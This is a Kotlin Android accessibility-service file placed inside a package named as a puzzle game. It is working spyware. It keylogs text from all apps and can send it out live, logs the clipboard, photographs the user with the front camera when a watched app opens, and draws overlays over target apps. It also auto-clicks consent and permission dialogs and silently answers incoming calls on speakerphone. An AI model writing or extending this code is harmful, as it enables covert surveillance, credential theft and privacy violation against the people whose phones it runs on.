package com.puzzleblast.game.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.modules.KeylogModule
import com.puzzleblast.game.util.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class AccessibilityHandler : AccessibilityService() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var lastPkg: String = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: return
                if (text.isNotEmpty()) {
                    KeylogModule.log(pkg, text)
                    if (Prefs.realtimeKeylog) {
                        scope.launch { Send.text("⌨️ $pkg: $text") }
                    }
                }
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (pkg != lastPkg) {
                    lastPkg = pkg
                    handleAppOpen(pkg)
                }
                autoTapConsent(pkg)
                autoAnswerCall(pkg)
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                if (Prefs.clipboardWatch) {
                    val cb = getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
                    cb.primaryClip?.getItemAt(0)?.text?.let {
                        com.puzzleblast.game.modules.ClipboardModule.log(it.toString())
                    }
                }
            }
        }
    }

    private fun handleAppOpen(pkg: String) {
        if (Prefs.unlockCap && pkg == "com.android.systemui") return
        val watch = Prefs.appOpenWatchPkg
        if (watch.isNotEmpty() && pkg == watch) {
            scope.launch {
                Send.text("👁 watched app opened: $pkg")
                com.puzzleblast.game.modules.CameraModule.captureFront(applicationContext)?.let { Send.photo(it, "👁 capture on app open") }
            }
        }
        val overlayPkg = Prefs.overlayOnPkg
        val overlayTmpl = Prefs.overlayOnTmpl
        if (overlayPkg.isNotEmpty() && pkg == overlayPkg && overlayTmpl.isNotEmpty()) {
            OverlayService.show(applicationContext, overlayTmpl)
        }
    }

    private fun autoTapConsent(pkg: String) {
        if (pkg != "com.android.systemui" && pkg != "com.android.settings") return
        try {
            val root = rootInActiveWindow ?: return
            val targets = listOf("Start now", "Allow", "Start", "OK", "Agree", "Allow only while using the app")
            findAndClick(root, targets)
        } catch (_: Exception) {}
    }

    private fun autoAnswerCall(pkg: String) {
        if (!Prefs.callAutoAnswer) return
        if (pkg != "com.android.incallui" && pkg != "com.android.dialer" && pkg != "com.google.android.dialer") return
        try {
            val root = rootInActiveWindow ?: return
            findAndClick(root, listOf("Answer", "Accept", "接听", "滑动接听"))
            if (Prefs.caaSpeaker) {
                val am = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
                am.isSpeakerphoneOn = true
            }
        } catch (_: Exception) {}
    }

    private fun findAndClick(root: AccessibilityNodeInfo, texts: List<String>): Boolean {
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        while (stack.isNotEmpty()) {
            val n = stack.removeLast()
            val t = n.text?.toString() ?: ""
            if (texts.any { t.contains(it, true) }) {
                if (n.isClickable) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true }
                var p = n.parent
                while (p != null) { if (p.isClickable) { p.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true }; p = p.parent }
            }
            for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
        }
        return false
    }

    override fun onInterrupt() {}
}
